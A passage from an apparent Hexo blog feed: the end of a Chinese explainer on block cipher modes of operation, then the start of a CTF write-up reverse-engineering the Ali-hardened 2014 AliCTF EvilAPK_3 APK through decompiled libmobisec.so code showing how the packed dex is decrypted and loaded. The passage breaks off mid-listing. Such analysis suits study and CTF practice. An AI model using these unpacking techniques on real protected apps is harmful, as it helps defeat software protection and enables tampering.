CBC）需要最后一块在加密前进行填充。有数种填充方法，其中最简单的一种是在明文的最后填充空字符以使其长度为块长度的整数倍，但必须保证可以恢复明文的原始长度；例如，若明文是 C 语言风格的字符串，则只有串尾会有空字符。稍微复杂一点的方法则是原始的 DES 使用的方法，即在数据后添加一个 1 位，再添加足够的 0 位直到满足块长度的要求；若消息长度刚好符合块长度，则添加一个填充块。最复杂的则是针对 CBC 的方法，例如密文窃取，残块终结等，不会产生额外的密文，但会增加一些复杂度。布鲁斯·施奈尔和尼尔斯·弗格森提出了两种简单的可能性：添加一个值为 128 的字节（十六进制的 80），再以 0 字节填满最后一个块；或向最后一个块填充 n 个值均为 n 的字节。</p><p>CFB，OFB 和 CTR 模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。</p><h1 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a>常用模式</h1><h2 id="电子密码本（ECB）"><a href="#电子密码本（ECB）" class="headerlink" title="电子密码本（ECB）"></a>电子密码本（ECB）</h2><p>最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><img src="/pics/分组密码的工作模式/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/2.png" srcset="/img/loading.gif" alt></p><p>ECB 的缺点在于同样的明文块会被加密成相同的密文块，因此它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。</p><p>ECB 模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用 ECB 模式的 Blowfish 密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h2 id="密码块链接（CBC）"><a href="#密码块链接（CBC）" class="headerlink" title="密码块链接（CBC）"></a>密码块链接（CBC）</h2><p>1976 年，IBM 发明了密码分组链接（CBC，Cipher-block chaining）模式。在 CBC 模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><img src="/pics/分组密码的工作模式/3.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/4.png" srcset="/img/loading.gif" alt></p><p>若第一个块的下标为 1，则 CBC 模式的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = C_i<br>$$</p><p>CBC 是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h2 id="填充密码块链接（PCBC）"><a href="#填充密码块链接（PCBC）" class="headerlink" title="填充密码块链接（PCBC）"></a>填充密码块链接（PCBC）</h2><p>填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><img src="/pics/分组密码的工作模式/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/6.png" srcset="/img/loading.gif" alt></p><p>PCBC 的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = P_i \oplus C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = P_i \oplus C_i<br>$$</p><p>PCBC 主要用于 Kerberos v4 和 WASTE 中，而在其它场合的应用较少。对于使用 PCBC 加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5 没有使用 PCBC。</p><h2 id="密文反馈（CFB）"><a href="#密文反馈（CFB）" class="headerlink" title="密文反馈（CFB）"></a>密文反馈（CFB）</h2><p>密文反馈（CFB，Cipher feedback）模式类似于 CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB 的解密过程几乎就是颠倒的 CBC 的加密过程：</p><p>$$<br>C_i = E_K(IV \oplus P_i) \\<br>P_i = E_K(IV \oplus C_i) \\<br>IV = C_i<br>$$</p><p><img src="/pics/分组密码的工作模式/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/8.png" srcset="/img/loading.gif" alt></p><p>上述公式是描述的是最简单的 CFB，在这种模式下，它的自同步特性仅仅与 CBC 相同，即若密文的一整块发生错误，CBC 和 CFB 都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用 CFB 的自同步性。</p><p>为了利用 CFB 制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用 IV 将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高 $x$ 位与明文的 $x$ 进行异或，以产生密文的 $x$ 位。下一步将生成的 $x$ 位密文移入寄存器中，并对下面的 $x$ 位明文重复这一过程。解密过程与加密过程相似，以 IV 开始，对寄存器加密，将结果的高 $x$ 与密文异或，产生 $x$ 位明文，再将密文的下面 $x$ 位移入寄存器。</p><p>下式中 $S_i$ 是移位寄存器的第 $i$ 个状态，$a \ll x$ 是指将 $a$ 移位 $x$ 位，$head(a, x)$ 是指 $a$ 的高 $x$ 位，$n$ 则是指 IV 的位数。</p><p>$$<br>C_i = head(E_K(S_{i-1}), x) \oplus P_i \\<br>P_i = head(E_K(S_{i-1}), x) \oplus C_i \\<br>S_i = ((S_{i-1} \ll x) + C_i) mod\ 2^n \\<br>IV = S_i<br>$$</p><p>若密文的 $x$ 位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与 CBC 相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与 CBC 类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB 拥有一些 CBC 所不具备的特性，这些特性与 OFB 和 CTR 的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h2 id="输出反馈（OFB）"><a href="#输出反馈（OFB）" class="headerlink" title="输出反馈（OFB）"></a>输出反馈（OFB）</h2><p>输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于 XOR 操作的对称性，加密和解密操作是完全相同的：</p><p>$$<br>C_i = P_i \oplus O_i \\<br>P_i = C_i \oplus O_i \\<br>O_i = E_K(O_{i-1}) \\<br>IV = O_i<br>$$</p><p><img src="/pics/分组密码的工作模式/9.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/10.png" srcset="/img/loading.gif" alt></p><p>每个使用 OFB 的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对 IV 进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全 0 的 CBC 模式产生 OFB 模式的密钥流。这种方法十分实用，因为可以利用快速的 CBC 硬件实现来加速 OFB 模式的加密过程。</p><h2 id="计数器模式（CTR）"><a href="#计数器模式（CTR）" class="headerlink" title="计数器模式（CTR）"></a>计数器模式（CTR）</h2><p>PS：CTR 模式（Counter mode，CM）也被称为 ICM 模式（Integer Counter Mode，整数计数模式）和 SIC 模式（Segmented Integer Counter）。</p><p>与 OFB 相似，CTR 将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR 已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非 CTR 模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR 模式的特征类似于 OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR 适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的 IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><img src="/pics/分组密码的工作模式/11.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/12.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2014-AliCTF-EvilAPK_3</title>
    <link href="/2020/02/15/2014-AliCTF-EvilAPK_3/"/>
    <url>/2020/02/15/2014-AliCTF-EvilAPK_3/</url>
    
    <content type="html"><![CDATA[<p>接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。</p><a id="more"></a><h1 id="Analysis（classes-dex）"><a href="#Analysis（classes-dex）" class="headerlink" title="Analysis（classes.dex）"></a>Analysis（classes.dex）</h1><p>这道题目是阿里 14 年出的，先导入 jadx 看看反编译后大概的内容。在 AndroidManifest.xml 中，可以看到先设置了入口点为 com.ali.mobisecenhance.StubApplication，猜测这里可能是阿里加固自己添加的一个入口，用来执行一些初始化的操作，比如解密 dex，反调试，检测模拟器等等之类的。调用完 StubApplication 后，才会调用 MainActivity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.ali.tg.testapp&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;8&quot; android:targetSdkVersion=&quot;9&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:name=&quot;com.ali.mobisecenhance.StubApplication&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot;&gt;        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;.WebViewActivity&quot; /&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>在反编译出来的 Java 文件中，只能找到一个 StubApplication 类，其中的函数都是在 Native 层所实现，且加载了一个 mobisec 库。一般程序中是先执行 onCreate 函数，但 attachBaseContext 函数会早于 onCreate 函数执行：</p><pre><code class="java">package com.ali.mobisecenhance;import android.app.Application;import android.content.Context;public class StubApplication extends Application {    private native void b(ClassLoader classLoader, Context context);    protected native void attachBaseContext(Context context);    public native void onCreate();    static {        System.loadLibrary(&quot;mobisec&quot;);    }}</code></pre><p>可以在 lib 文件夹下看到 libmobisec.so 库，同时还可以看到在 assets 文件夹中有两个 jar 文件：</p><pre><code class="bash">$ tree ..├── AndroidManifest.xml├── META-INF│   ├── MANIFEST.MF│   ├── TEST.RSA│   └── TEST.SF├── assets│   ├── cls.jar│   └── fak.jar├── classes.dex├── lib│   ├── armeabi│   │   ├── libhack.so│   │   ├── libmobisec.so│   │   └── libtranslate.so│   ├── armeabi-v7a│   │   ├── libhack.so│   │   ├── libmobisec.so│   │   └── libtranslate.so│   └── x86│       ├── libhack.so│       ├── libmobisec.so│       └── libtranslate.so├── res│   ├── drawable-hdpi│   │   ├── android.jpg│   │   └── android1.jpg│   ├── drawable-mdpi│   │   └── ic_launcher.png│   ├── drawable-xhdpi│   │   └── ic_launcher.png│   ├── drawable-xxhdpi│   │   └── ic_launcher.png│   └── layout│       ├── activity_main.xml│       └── webviewlayout.xml└── resources.arsc12 directories, 24 files</code></pre><p>file 一下，发现是 cls.jar 是一段不可识别的数据，fak.jar 判断出来是个 zip 文件：</p><pre><code class="bash">$ file cls.jarcls.jar: data$ file fak.jarfak.jar: Zip archive data, at least v?[0x314] to extract</code></pre><p>经过以上粗略的审计，可以猜测可能是在 libmobisec.so 实现了 StubApplication 中的函数，并对 assets 文件夹下的两个文件进行操作来还原出 MainActivity 中的函数。</p><h1 id="Analysis（libmobisec-so）"><a href="#Analysis（libmobisec-so）" class="headerlink" title="Analysis（libmobisec.so）"></a>Analysis（libmobisec.so）</h1><p>打开 IDA，最先定位到 JNI_OnLoad 函数，查看一下注册了哪些函数：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm, int a2){  const char *v2; // r2  jclass v3; // r1  signed int result; // r0  bool v5; // zf  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = (_JNIEnv *)a2;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65542) )  {    v2 = &quot;Failed to get the environment&quot;;LABEL_5:    _android_log_print(6, &quot;debug&quot;, v2);    return -1;  }  v3 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;com/ali/mobisecenhance/StubApplication&quot;);// locate class  if ( !v3 )  {    v2 = &quot;failed to get class reference&quot;;    goto LABEL_5;  }  v5 = env-&gt;functions-&gt;RegisterNatives(&amp;env-&gt;functions, v3, (const JNINativeMethod *)gMethods, 2) == 0;// register 2 methods  result = 65542;  if ( !v5 )    result = -1;  return result;}</code></pre><p>在 RegisterNatives 函数的参数中可以看到注册了两个函数，分别为 attachBaseContext 和 onCreate。在内存中可以找到两个函数对应的指针：</p><pre><code>.data:00054010 gMethods        DCD aAttachbasecont_0   ; DATA XREF: JNI_OnLoad+44↑o.data:00054010                                         ; .text:off_24784↑o.data:00054010                                         ; &quot;attachBaseContext&quot;.data:00054014                 DCD aLandroidConten_1   ; &quot;(Landroid/content/Context;)V&quot;.data:00054018                 DCD sub_24D3C+1.data:0005401C                 DCD aOncreate           ; &quot;onCreate&quot;.data:00054020                 DCD aV                  ; &quot;()V&quot;.data:00054024                 DCD sub_24498+1</code></pre><p>因为 attachBaseContext 先于 onCreate 函数执行，这里先看一下 attachBaseContext。跟着 log 可以对函数有一个大体的了解，在一处 log 里有“enter new application”的信息，猜测可能是完成了解码进入 MainActivity。在该处上下看看可以发现一个 parse_dex 函数，很有可能是解析出真正的 dex 文件的函数：</p><pre><code class="cpp">int __fastcall attachBaseContext(_JNIEnv *a1, jobject *a2, jobject *a3){  jobject *v3; // r8  jobject *v4; // r10  _JNIEnv *env; // r4  _JNIEnv *v6; // r1  int v7; // r2  int result; // r0  ali *v9; // r0  int v10; // r0  int v11; // r0  int v12; // r0  int v13; // r5  int v14; // r0  int v15; // r0  int v16; // r0  int v17; // r0  int v18; // r0  char *v19; // r0  int v20; // r0  int v21; // r0  void *v22; // r0  void *v23; // r8  const char *v24; // r0  const char *v25; // r5  size_t v26; // r0  int v27; // r5  int v28; // r8  int v29; // r0  int v30; // r5  const char *v31; // r2  int v32; // r0  ali *v33; // r0  int v34; // r4  unsigned __int64 v35; // r2  int v36; // [sp+8h] [bp-78h]  __int64 v37; // [sp+18h] [bp-68h]  char v38; // [sp+24h] [bp-5Ch]  char v39; // [sp+3Ch] [bp-44h]  char *v40; // [sp+4Ch] [bp-34h]  char *v41; // [sp+50h] [bp-30h]  v3 = a2;  v4 = a3;  env = a1;  _android_log_print(6, &quot;debug&quot;, &quot;in...&quot;);  result = ali::init_classes(env, v6, v7);      // init classes  if ( result )    return result;  v9 = (ali *)_JNIEnv::CallNonvirtualVoidMethod(env, v3, ali::ContextWrapper, dword_54128, v4);  v36 = ali::NanoTime(v9);  v10 = _JNIEnv::GetObjectClass(env, v3);  v11 = _JNIEnv::GetMethodID(env, v10, &quot;getFilesDir&quot;, &quot;()Ljava/io/File;&quot;);  v12 = _JNIEnv::CallObjectMethod(env, v3, v11);  v13 = v12;  v14 = _JNIEnv::GetObjectClass(env, v12);  v15 = _JNIEnv::GetMethodID(env, v14, &quot;getAbsolutePath&quot;, &quot;()Ljava/lang/String;&quot;);  v16 = _JNIEnv::CallObjectMethod(env, v13, v15);  sub_247D8(&amp;v39, env, v16);  if ( &amp;v39 != (char *)&amp;ali::g_filePath )    std::string::_M_assign((std::string *)&amp;ali::g_filePath, v41, v40);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);  _android_log_print(3, &quot;debug&quot;, &quot;global files path is %s&quot;, dword_540E8);  v17 = _JNIEnv::CallObjectMethod(env, v3, dword_541A4);  if ( ali::sdk_int &lt;= 8 )  {    v20 = _JNIEnv::GetObjectField(env, v17, dword_5416C);    sub_247D8(&amp;v38, env, v20);    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v39, &amp;v38, &quot;/lib&quot;);    if ( &amp;v39 != (char *)&amp;ali::g_libPath )      std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);    v19 = &amp;v38;  }  else  {    v18 = _JNIEnv::GetObjectField(env, v17, dword_54170);    sub_247D8(&amp;v39, env, v18);    if ( &amp;v39 != (char *)&amp;ali::g_libPath )      std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40);    v19 = &amp;v39;  }  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v19);  _android_log_print(3, &quot;debug&quot;, &quot;global native path is %s&quot;, dword_540D0);  v21 = _JNIEnv::CallObjectMethod(env, v3, dword_541B0);  sub_247D8(&amp;v39, env, v21);  if ( &amp;v39 != (char *)&amp;ali::g_apkPath )    std::string::_M_assign((std::string *)&amp;ali::g_apkPath, v41, v40);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);  setenv(&quot;APKPATH&quot;, (const char *)dword_540B8, 1);  _android_log_print(3, &quot;debug&quot;, &quot;global apk path is %s&quot;, dword_540B8);  sub_24A64(env, v3);  v22 = (void *)_JNIEnv::CallObjectMethod(env, v4, dword_541A0);  v23 = v22;  if ( v22 )  {    v24 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, v22, 0);    v25 = v24;    v26 = strlen(v24);    std::string::_M_assign((std::string *)&amp;ali::g_pkgName, v25, &amp;v25[v26]);    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, v23, v25);  }  v37 = 0LL;  v27 = _JNIEnv::CallObjectMethod(env, v4, dword_541A8);  parse_dex(env, &amp;v37);                         // parse dex?  replace_classloader_cookie(env, v27, v37, HIDWORD(v37));  _android_log_print(3, &quot;debug&quot;, &quot;enter new application&quot;);// enter MainActivity?  v28 = dword_54120;  _JNIEnv::NewStringUTF(env, &quot;android.app.Application&quot;);  v29 = _JNIEnv::CallObjectMethod(env, v27, v28);  v30 = v29;  if ( v29 )  {    v32 = _JNIEnv::GetMethodID(env, v29, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);    dword_540A0 = _JNIEnv::NewObject(env, v30, v32);    _JNIEnv::CallVoidMethod(env, dword_540A0, dword_54134, v4);    _JNIEnv::DeleteLocalRef(env, v30);    v31 = &quot;exit new application&quot;;  }  else  {    v31 = &quot;can&#39;t findClass realAppClass&quot;;  }  v33 = (ali *)_android_log_print(3, &quot;debug&quot;, v31);  if ( dword_540A0 )  {    v33 = (ali *)env-&gt;functions-&gt;NewGlobalRef(&amp;env-&gt;functions, (jobject)dword_540A0);    dword_540A0 = (int)v33;  }  v34 = ali::NanoTime(v33);  _android_log_print(3, &quot;debug&quot;, &quot;##### attachBaseContext spent:&quot;);  ali::PrettyDuration((ali *)(v34 - v36), v35);  result = _android_log_print(3, &quot;debug&quot;, &quot;exit attachBaseContext&quot;);  return result;}</code></pre><p>接下来进入 parse_dex 进行分析。一开始判断了是采用了 Dalvik 模式还是 ART 模式。我的机器是 Android 4.4.4，用的是 Dalvik 模式，那就只分析一下 Dalvik 的部分。接下来对 SDK 的版本进行了判断，是否大于 SDK13。我用的机器是 SDK19，故下面应该是调用了 openWithHeader 函数。之后的部分看到是用 dlopen 打开 libdvm.so，并开始执行程序，所以就不做进一步分析。主要应该就是 openWithHeader 中的内容解析了出了 dex 文件：</p><pre><code class="cpp">signed int __fastcall parse_dex(_JNIEnv *a1, __int64 *a2){  int v2; // r7  const char *v3; // r1  char *v4; // r0  char *v5; // r9  unsigned __int8 *v6; // r3  int v7; // r2  int v8; // t1  int fd; // ST14_4  int v10; // r8  int v11; // r7  int v12; // r5  int v13; // r0  int v14; // r5  int v15; // r0  int v16; // r7  int v17; // r1  int v18; // r5  int (__fastcall *v19)(int, signed int); // r5  int v20; // r5  unsigned __int8 *v21; // r8  const char *v22; // r3  char *v23; // r0  char *v24; // r0  char *v25; // r6  ali::EncFile *v26; // r7  int v27; // r0  int *v28; // r0  char *v29; // r0  int v30; // r10  void *v31; // r7  int (__fastcall *v32)(unsigned __int8 *, int, signed int *); // r9  int (__fastcall *v33)(_DWORD); // r7  const char *v34; // r2  int v35; // r9  signed int v36; // r7  _DWORD *v37; // r9  _BYTE *v38; // r5  unsigned __int8 *v39; // r3  void *v40; // r0  JNINativeMethod *v41; // r0  unsigned __int8 *v42; // r3  signed int v43; // r3  _JNIEnv *v45; // [sp+8h] [bp-2A0h]  __int64 *v46; // [sp+10h] [bp-298h]  int v47; // [sp+24h] [bp-284h]  unsigned __int8 *v48; // [sp+28h] [bp-280h]  unsigned __int8 *v49; // [sp+2Ch] [bp-27Ch]  void (__cdecl *v50)(const unsigned int *, jvalue *); // [sp+30h] [bp-278h]  char v51; // [sp+34h] [bp-274h]  signed int v52[2]; // [sp+38h] [bp-270h]  char s; // [sp+40h] [bp-268h]  char v54; // [sp+54h] [bp-254h]  int v55; // [sp+64h] [bp-244h]  int v56; // [sp+68h] [bp-240h]  char v57; // [sp+6Ch] [bp-23Ch]  const char *v58; // [sp+80h] [bp-228h]  char v59; // [sp+84h] [bp-224h]  const char *v60; // [sp+98h] [bp-210h]  char v61; // [sp+9Ch] [bp-20Ch]  unsigned int v62; // [sp+B0h] [bp-1F8h]  char v63; // [sp+B4h] [bp-1F4h]  char v64; // [sp+CCh] [bp-1DCh]  int v65; // [sp+E0h] [bp-1C8h]  char v66; // [sp+E4h] [bp-1C4h]  char v67; // [sp+FCh] [bp-1ACh]  const char *v68; // [sp+110h] [bp-198h]  char v69; // [sp+114h] [bp-194h]  char v70; // [sp+12Ch] [bp-17Ch]  const char *v71; // [sp+140h] [bp-168h]  char v72; // [sp+144h] [bp-164h]  char *v73; // [sp+154h] [bp-154h]  char *v74; // [sp+158h] [bp-150h]  char v75; // [sp+15Ch] [bp-14Ch]  char v76; // [sp+174h] [bp-134h]  char v77; // [sp+18Ch] [bp-11Ch]  char v78; // [sp+1A4h] [bp-104h]  char v79; // [sp+1BCh] [bp-ECh]  char v80; // [sp+1D4h] [bp-D4h]  char v81; // [sp+1ECh] [bp-BCh]  char v82; // [sp+204h] [bp-A4h]  char v83; // [sp+21Ch] [bp-8Ch]  char v84; // [sp+234h] [bp-74h]  int v85; // [sp+244h] [bp-64h]  unsigned __int8 *v86; // [sp+248h] [bp-60h]  char v87; // [sp+24Ch] [bp-5Ch]  char v88; // [sp+264h] [bp-44h]  char *v89; // [sp+274h] [bp-34h]  char *v90; // [sp+278h] [bp-30h]  v45 = a1;  v46 = a2;  _android_log_print(3, &quot;debug&quot;, &quot;enter parse_dex&quot;);  if ( ali::isDalvik )                          // dalvik or art  {    v47 = 0;    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;ali::g_filePath, &quot;/cls.jar&quot;);// locate cls.jar    v25 = v90;    v26 = (ali::EncFile *)operator new(0xCu);    ali::EncFile::EncFile(v26, v25);    v48 = 0;    v49 = 0;    if ( ali::sdk_int &gt; 13 )                    // sdk version &gt; 13    {      v27 = ali::EncFile::openWithHeader(v26, &amp;v48, (unsigned int *)&amp;v47, 0x10u);      v49 = v48 + 16;    }    else                                        // sdk version &lt;= 13 ( android 3.x )    {      v27 = ali::EncFile::open(v26, &amp;v49, (unsigned int *)&amp;v47);    }    if ( v49 == (unsigned __int8 *)-1 )    {      v28 = (int *)_errno(v27);      v29 = strerror(*v28);      _android_log_print(3, &quot;debug&quot;, &quot;mmap dex file :%s&quot;, v29);LABEL_45:      v24 = &amp;v88;      goto LABEL_46;    }    v30 = *((_DWORD *)v49 + 8);    if ( ali::sdk_int &gt; 13 )                    // sdk version &gt; 13    {      v40 = dlopen(&quot;libdvm.so&quot;, 1);             // open libdvm.so and start execute program      v41 = (JNINativeMethod *)dlsym(v40, &quot;dvm_dalvik_system_DexFile&quot;);      v50 = 0;      lookup(v41, &quot;openDexFile&quot;, &quot;([B)I&quot;, &amp;v50);      v42 = v48;      *((_DWORD *)v48 + 2) = v47;      *(_DWORD *)&amp;v51 = v42;      ((void (*)(void))v50)();      v43 = v52[0];      *v46 = v52[0];      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 32) = *(_DWORD *)(v43 + 16);      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 36) = v47;      ali::EncFile::~EncFile(v26);      operator delete((void *)v26);    }    else                                        // sdk version &lt;= 13 ( android 3.x )    {      v31 = dlopen(&quot;libdvm.so&quot;, 1);      v32 = (int (__fastcall *)(unsigned __int8 *, int, signed int *))dlsym(v31, &quot;dvmDexFileOpenPartial&quot;);      v33 = (int (__fastcall *)(_DWORD))dlsym(v31, &quot;dexCreateClassLookup&quot;);      v52[0] = 0;      if ( v32(v49, v30, v52) == -1 )      {        v34 = &quot;dvmDexFileOpenPartial error&quot;;LABEL_40:        _android_log_print(3, &quot;debug&quot;, v34);        goto LABEL_45;      }      v35 = *(_DWORD *)v52[0];      *(_DWORD *)(v35 + 36) = v33(*(_DWORD *)v52[0]);      v36 = v52[0];      if ( !*(_DWORD *)(*(_DWORD *)v52[0] + 36) )      {        v34 = &quot;dexCreateClassLookup error&quot;;        goto LABEL_40;      }      v37 = malloc(0x2Cu);      v38 = malloc(0x14u);      strdup((const char *)&amp;unk_4CEE9);      v38[4] = 0;      v38[5] = 0;      *((_DWORD *)v38 + 2) = 0;      v39 = v49;      *(_DWORD *)v38 = v38;      *((_DWORD *)v38 + 3) = v37;      v37[10] = v36;      *(_DWORD *)(v36 + 32) = v39;      *(_DWORD *)(v36 + 36) = v47;      *v46 = (signed int)v38;    }    v23 = &amp;v88;    goto LABEL_44;  }  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v54, &amp;ali::g_filePath, &quot;/cls.jar&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v57, &amp;ali::g_filePath, &quot;/cls.dex&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v59, &amp;ali::g_filePath, &quot;/fak.jar&quot;);  _android_log_print(3, &quot;debug&quot;, &quot;before oat gen&quot;);  if ( !access(v58, 0) )    goto LABEL_24;  v2 = android_getCpuFamily();  std::string::string(&amp;v63, &quot;arm&quot;, &amp;v51);  switch ( v2 )  {    case 1:      v3 = &quot;arm&quot;;LABEL_5:      std::string::operator=(&amp;v63, v3);      break;    case 2:      v3 = &quot;x86&quot;;      goto LABEL_5;    case 3:    case 6:      v3 = &quot;mips&quot;;      goto LABEL_5;    case 4:      v3 = &quot;arm64&quot;;      goto LABEL_5;    case 5:      v3 = &quot;x86_64&quot;;      goto LABEL_5;  }  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v64, &amp;ali::g_libPath, &quot;/libhack.so&quot;);  v4 = getenv(&quot;LD_PRELOAD&quot;);  v5 = v4;  if ( v4 )  {    _android_log_print(3, &quot;debug&quot;, &quot;the system already define LD_PRELOAD=%s&quot;, v4);    std::string::string(&amp;v84, v5, v52);    v6 = v86;    v7 = v85;    while ( v6 != (unsigned __int8 *)v7 )    {      v8 = *v6++;      if ( v8 == 32 )        *(v6 - 1) = 58;    }    